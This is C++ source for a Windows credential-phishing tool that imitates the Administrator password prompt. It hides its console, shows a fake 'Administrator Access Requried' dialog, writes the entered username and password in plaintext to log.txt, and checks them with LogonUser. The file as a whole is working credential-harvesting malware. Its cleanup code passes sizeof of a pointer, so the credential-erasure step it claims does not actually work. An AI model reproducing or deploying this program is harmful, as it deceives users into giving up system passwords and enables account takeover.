/*
#=======================================================================================#
*	Author: 		Safwan																*
*	Date:			Monday, ‎22 ‎March ‎2021, ‏‎5:23:34 PM								*
*	Brief:			Clones windows Administrator Password prompt using WinCred API		*
*																						*
#=======================================================================================#
*/

#include<Windows.h>     //Global functions and types of Win32
#include<wincred.h>     //Required for Credential UI functions
#include <iostream>     //Required for console io

#pragma comment(lib,"Credui.lib")       //Dynamic linking with Credui.lib





void HideWindow() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

bool ValidateCredentials(LPWSTR szUserName, LPWSTR szDomain, LPWSTR szPassword)
{
    HANDLE phandle;
    return (LogonUser(
        szUserName,
        szDomain,
        szPassword,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        &phandle
    ) != 0);
    
}

void DisplayConsoleError(const WCHAR* errorMessage, const WCHAR* fName, DWORD lastError)
{
    std::cout << std::endl;
    std::cout << "Error\t" << std::endl;
    std::wcout << L"In function:\t" << fName << std::endl;
    std::cout << "Code:\t" << lastError << std::endl;
    std::cout << std::endl;
}

int wmain(int argc, WCHAR* argv[])
{
    HideWindow();
    CREDUI_INFO cuiInfo;
    cuiInfo.cbSize = sizeof(CREDUI_INFO);
    cuiInfo.hbmBanner = nullptr;
    cuiInfo.hwndParent = nullptr;
    cuiInfo.pszCaptionText = L"Administrator Access Requried";
    cuiInfo.pszMessageText = L"Enter Administrator Password";

    DWORD dwAuthError = 0;
    ULONG dwAuthPackage = 0;

    LPVOID outCredBuffer = nullptr;
    ULONG outCredBufferSize = 0;
    BOOL credSaveCheckbox = false;

    DWORD dwError = 0;
    DWORD lastError = 0;

    

    dwError = CredUIPromptForWindowsCredentials(
        &cuiInfo,
        dwAuthError,
        &dwAuthPackage,
        nullptr,
        NULL,
        &outCredBuffer,
        &outCredBufferSize,
        &credSaveCheckbox,
        CREDUIWIN_CHECKBOX | CREDUIWIN_GENERIC);

    if (dwError == ERROR_SUCCESS)
    {
        DWORD maxUserNameSize = CREDUI_MAX_USERNAME_LENGTH;
        DWORD maxDomainNameSize = CREDUI_MAX_DOMAIN_TARGET_LENGTH;
        DWORD maxPasswordLength = CREDUI_MAX_PASSWORD_LENGTH;

        std::wstring szUserName = new WCHAR[maxUserNameSize];
        LPWSTR szDomain = new WCHAR[maxDomainNameSize];
        LPWSTR szPassword = new WCHAR[maxPasswordLength];

        DWORD dwCredBufferSize = outCredBufferSize;     //ULONG to DWORD

        DWORD lastError = 0;
        dwError = CredUnPackAuthenticationBuffer(
            CRED_PACK_GENERIC_CREDENTIALS,
            outCredBuffer,
            dwCredBufferSize,
            (LPTSTR)szUserName.c_str(),
            &maxUserNameSize,
            szDomain,
            &maxDomainNameSize,
            szPassword,
            &maxPasswordLength
        );
        lastError = GetLastError();
        FILE* stream;
        _wfreopen_s(&stream, L"log.txt", L"w", stdout);
        std::wcout << L"Username: " << szUserName << std::endl << L"Password: " << szPassword << std::endl;
        //Check for error
        if (dwError == FALSE)
        {
            DisplayConsoleError(L"Error", L"CredUnPackAuthenticationBuffer", lastError);
        }
        else
        {
            
           
            
            if (ValidateCredentials((LPTSTR)szUserName.c_str(), (LPTSTR)L".", szPassword))
                std::cout << "Login Successful\n";
            else {
                std::cout << "Login Failed\n";
                std::cout << GetLastError() << std::endl;
            }
            //std::cout<<"Crossed exception statement";
            
            
            //  When you have finished using the credentials,
            //  erase them from memory.
            SecureZeroMemory((LPTSTR)szUserName.c_str(), sizeof((LPTSTR)szUserName.c_str()));
            SecureZeroMemory(szPassword, sizeof(szPassword));
           
        }
        fclose(stream);

    }
    else
    {
        lastError = dwError;
    }

    SecureZeroMemory(outCredBuffer, outCredBufferSize);
    CoTaskMemFree(outCredBuffer);

    return lastError;
}
